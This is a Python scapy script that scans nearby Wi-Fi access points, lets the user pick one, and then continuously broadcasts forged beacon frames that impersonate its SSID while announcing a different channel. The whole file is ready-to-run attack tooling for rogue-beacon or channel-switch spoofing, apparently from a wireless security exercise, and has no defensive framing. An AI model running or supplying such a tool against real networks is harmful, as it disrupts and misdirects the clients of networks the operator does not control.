#!/usr/bin/env python

from scapy.all import *
import sys
import argparse
import os


# A class to represent a Wifi AP
class AP:
    # Constructor
    def __init__(self, bssid, ssid, channel, crypto, power):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.crypto = crypto
        self.power = power
    # Display a single AP
    def display(self):
        print("----------------------------------")
        print("|", self.bssid.center(18, ' '),"|",
         self.ssid.center(20, ' '),"|",
         self.channel,"|",
         self.crypto,"|",
         self.power," dBm |"),
        print("----------------------------------")
        print("")
    # Display an AP with a list index
    def display(self, index):
        print(
         str(index).ljust(index_col_width, ' '), "|",
         self.bssid.ljust(bssid_col_width, ' '),"|",
         self.ssid.ljust(ssid_col_width, ' '),"|",
         str(self.channel).ljust(channel_col_width, ' '),"|",
         str(self.crypto).ljust(crypto_col_width, ' '),"|",
         str(self.power).ljust(power_col_width, ' '),"|"
        )



# Global variable containing all scanned APs
ap_list = []

# Lots of formatting variables, don't worry about those
index_col_width = 6
bssid_col_width = 18
ssid_col_width = 25
channel_col_width = 8
crypto_col_width = 25
power_col_width = 12
array_width = index_col_width + bssid_col_width + ssid_col_width + channel_col_width + crypto_col_width + power_col_width + 17

# Callback function to use on each sniffed packet
# Source: https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
def callback(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode()
        try:
            dbm_signal = pkt.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        stats = pkt[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        crypto = stats.get("crypto")

        wifi = AP(bssid, ssid, channel, crypto, dbm_signal)

        if not bssid_already_scanned(wifi.bssid):
            ap_list.append(wifi)


# Utiliy function to check if the BSSID has already been scanned
def bssid_already_scanned(bssid):
    bssids = [net.bssid for net in ap_list]
    if bssid in bssids:
        return True
    else:
        return False

# Utility function to increment the channel of our monitor interface
def increment_channel(interface, current_channel):
    channel = current_channel + 1
    os.system("iw dev %s set channel %d" %(interface, channel))
    return channel


def spoof_beacon(ap, interface):
    new_channel = 0
    match(ap.channel):
        case 1: 
            new_channel = 7
        case 6:
            new_channel = 12
        case 11:
            new_channel = 5
        case _:
            print(f'Not handled channel {ap.channel}')
            exit()

    # Forge an beacon frame to inform clients of the network the channel change is occuring
    dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2 = ap.bssid, addr3 = ap.bssid)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ap.ssid, len=len(ap.ssid))
    new_essid = Dot11Elt(ID="DSset", info=chr(new_channel))
    # Forge the frame
    frame = RadioTap()/dot11/beacon/essid/new_essid

    # Send the forged beacon
    sendp(frame, iface=interface, inter=0.100, loop=1)


def main():

    # Argument parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface")
    parser.add_argument("-p", "--packet-count")
    args = parser.parse_args()

    # Variables to contain argument values
    interface = ""
    packet_count = ""

    # Get inteface name from args
    if args.interface == None:
        print("[WARN] No interface specified, defaulting to wlan0mon")
        interface = "wlan0mon"
    else:
        interface = args.interface

    # Get packet_count for sniffing duration from args
    if args.packet_count == None:
        print("[WARN] No packet count for sniffing defined, defaulting to 10")
        packet_count = 10
    else:
        packet_count = int(args.packet_count)
        
    # Sniff only as long as packet_count
    channel = 0
    while channel <= 12:
        sniff(iface=interface, prn = callback, count = packet_count)
        channel = increment_channel(interface, channel)
        print(f'Scanned channel {channel} for SSIDs')

    # Display found SSIDs
    i = 0
    print("index".center(index_col_width, ' '), "|",
    "BSSID".center(bssid_col_width, ' '),"|",
    "SSID".center(ssid_col_width, ' '),"|",
    "Channel".center(channel_col_width, ' '),"|",
    "Crypto".center(crypto_col_width, ' '),"|",
    "Power [dBm]".center(power_col_width, ' '),"|")
    print('-'*array_width)
    for n in ap_list:
        n.display(i)
        i += 1

    # Ask user to select the SSID
    print("Which SSID do you want to spoof ? ")
    chosen = -1
    while chosen not in range(0, len(ap_list)):
        chosen = int(input("Choose SSID: "))

    # Send spoofed beacon with chosen AP
    spoofed_ap = ap_list[chosen]
    spoofed_ap.bssid = "DE:AD:CA:FE:F0:0D"

    input("Press enter to begin spoofing")
    spoofed_ap.display("CHOSEN")
    spoof_beacon(spoofed_ap, interface)

if __name__ == "__main__":
    main()